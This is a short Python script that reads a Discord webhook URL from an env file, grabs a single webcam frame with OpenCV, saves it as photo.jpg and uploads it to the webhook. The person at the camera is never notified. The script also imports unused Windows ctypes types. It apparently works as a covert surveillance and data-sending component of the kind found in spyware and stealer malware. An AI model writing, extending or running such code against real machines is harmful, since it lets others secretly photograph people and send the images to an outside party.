from dotenv import load_dotenv
import os
import cv2
import requests
import ctypes
from ctypes.wintypes import DWORD, HANDLE

load_dotenv("DcWebhook.env")
webhook_url = os.getenv("DISCORD_WEBHOOK_URL")

camera = cv2.VideoCapture(0)

if not camera.isOpened():
    print("Could not open camera")
    exit()

ret, frame = camera.read()
if ret:
    pictureFilename = "photo.jpg"
    cv2.imwrite(pictureFilename, frame)
    camera.release()

    with open(pictureFilename, "rb") as image_file:
        requests.post(webhook_url, files={"file": image_file})
else:
    print("Could not read image")
    camera.release()